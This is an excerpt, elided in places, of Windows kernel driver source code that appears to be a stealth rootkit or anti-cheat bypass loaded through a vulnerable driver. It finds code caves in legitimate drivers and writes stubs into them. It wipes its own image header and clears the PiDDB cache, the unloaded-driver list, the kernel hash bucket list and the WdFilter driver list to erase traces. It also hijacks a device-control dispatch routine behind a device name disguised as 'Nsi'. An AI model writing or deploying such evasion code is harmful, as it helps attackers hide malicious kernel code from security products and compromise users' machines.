...
static PUCHAR FindCodeCave(PVOID base, SIZE_T need) {
    ...
    for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        ...
        for (SIZE_T j = 0; j < need; j++) {
            if (!MmIsAddressValid(tail + j) || (tail[j] != 0x00 && tail[j] != 0xCC)) { ok = FALSE; break; }
        }
        if (ok) return tail;
    }
    return nullptr;
...
static PUCHAR WriteStubToCave(PUCHAR cave, PVOID target, UCHAR fill) {
    ...
    if (mapped) {
        if (NT_SUCCESS(MmProtectMdlSystemAddress(mdl, PAGE_EXECUTE_READWRITE))) {
            ...
            } else RtlFillMemory(mapped, 14, fill);
            st = STATUS_SUCCESS;
        } else st = STATUS_UNSUCCESSFUL;
        MmUnmapLockedPages(mapped, mdl);
    } else st = STATUS_INSUFFICIENT_RESOURCES;
...
static const WCHAR* const kHostCandidates[] = {
    L"\\Driver\\pcw", L"\\Driver\\mup", L"\\Driver\\rdyboost",
    L"\\Driver\\volsnap", L"\\Driver\\Beep",
};
...
static BOOLEAN WriteStomedImageToNewFile(PVOID stageData, ULONG stageSize,
    ...
    WcsAppendHex32(dirPath, ARRAYSIZE(dirPath), seed);
...
static VOID ProcessCommPacket(COMM_PACKET* pkt) {
    ...
    case COMM_OP_GET_STATUS:
        ...
        { BYPASS_STATUS snap = g_state->drvStatus;
          ...
          if (g_state->mmUnloadedArr) {
              UNICODE_STRING vn = RTL_CONSTANT_STRING(VEHICLE_DRIVER_NAME);
              BOOLEAN found = FALSE;
              for (ULONG i = 0; i < 50 && !found; i++)
                  if (g_state->mmUnloadedArr[i].Name.Buffer && RtlEqualUnicodeString(&g_state->mmUnloadedArr[i].Name, &vn, TRUE)) found = TRUE;
    ...
    case COMM_OP_CLEAN_VEHICLE:
        { UNICODE_STRING vn = RTL_CONSTANT_STRING(VEHICLE_DRIVER_NAME);
          if (g_state->ntBase) ClearUnloadedEntryByName(g_state->ntBase, &vn);
...
static NTSTATUS DispatchIoctl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    if (DeviceObject != g_state->pDevice) {
        ...
        IoCompleteRequest(Irp, IO_NO_INCREMENT); return STATUS_NOT_SUPPORTED;
    }
...
extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject,
    ...
    PVOID ntBase = DriverObject ? nullptr : GetNtKernelBaseAlt();
    if (DriverObject) {
        __try {
            PLDR_DATA_TABLE_ENTRY ldr = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
            if (ldr && MmIsAddressValid(ldr)) {
                UNICODE_STRING ntName; RtlInitUnicodeString(&ntName, L"ntoskrnl.exe");
                ...
                for (PLIST_ENTRY cur = head->Flink; cur && cur != head; cur = cur->Flink) {
                    ...
                    if (e->BaseDllName.Buffer && RtlEqualUnicodeString(&e->BaseDllName, &ntName, TRUE))
                        { ntBase = e->DllBase; break; }
                }
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) {}
    ...
    g_state->drvStatus.KDUPath = DriverObject ? 0 : 1;
    g_state->drvStatus.NtBase = (ULONGLONG)ntBase;
    g_state->ntBase = ntBase;

    // KDU path (no DriverObject)
    if (!DriverObject) {
        ...
        if (newBase && selfBase) {
            ...
            // Try to install cave in host driver
            ...
            if (hostLdr && hostLdr->DllBase) {
                ...
                if (cave) {
                    PUCHAR result = WriteStubToCave(cave, (PVOID)dispFn, 0xCC);
                    if (result) {
                        g_state->cavePtr = result;
                        g_state->drvStatus.CaveInstalled = 1;
                        g_state->drvStatus.CaveVA = (ULONGLONG)result;
        ...
        // Hook dispatch — g_state is fully initialized, stomped code reads it via pointer
        ...
        if (newBase && selfBase) {
            ...
            if (selfNt) {
                ...
                RtlZeroMemory(selfBase, min(selfNt->OptionalHeader.SizeOfImage, (ULONG)PAGE_SIZE));
            }
        }

        // Deferred cleanup — g_state->cleanupWork lives in NonPagedPool, always safe
        // But callback must point to STOMPED code, not pool (which will be zeroed)
        if (ntBase) {
    ...
    if (ntBase) {
        UNICODE_STRING vn = RTL_CONSTANT_STRING(VEHICLE_DRIVER_NAME);
        ClearPiDDBEntryByName(ntBase, &vn);
        ClearUnloadedEntryByName(ntBase, &vn);
        ClearKernelHashBucketList(ntBase);
        ClearWdFilterDriverList(ntBase);
        InstallWalkChainHook(ntBase);
    }
    g_state->origDevCtrl = DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL];
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchIoctl;

    WCHAR devNameBuf[64] = {};
    LARGE_INTEGER tsc; KeQueryTickCount(&tsc);
    ULONG nameSeed = (ULONG)(tsc.QuadPart ^ kBuildSeed);
    WcsAppend(devNameBuf, ARRAYSIZE(devNameBuf), L"\\Device\\Nsi");
    WcsAppendHex32(devNameBuf, ARRAYSIZE(devNameBuf), nameSeed);
    UNICODE_STRING devName; RtlInitUnicodeString(&devName, devNameBuf);
    NTSTATUS status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_NETWORK, 0, FALSE, &g_state->pDevice);
    if (!NT_SUCCESS(status)) { g_state->origDevCtrl = nullptr; return status; }
    g_state->pDevice->Flags |= DO_BUFFERED_IO;
    g_state->pDevice->Flags &= ~DO_DEVICE_INITIALIZING;

    WCHAR lnkBuf[64] = {};
    WcsAppend(lnkBuf, ARRAYSIZE(lnkBuf), L"\\DosDevices\\Nsi");
    WcsAppendHex32(lnkBuf, ARRAYSIZE(lnkBuf), nameSeed);
    UNICODE_STRING lnkName; RtlInitUnicodeString(&lnkName, lnkBuf);
    status = IoCreateSymbolicLink(&lnkName, &devName);
    if (!NT_SUCCESS(status)) { IoDeleteDevice(g_state->pDevice); return status; }
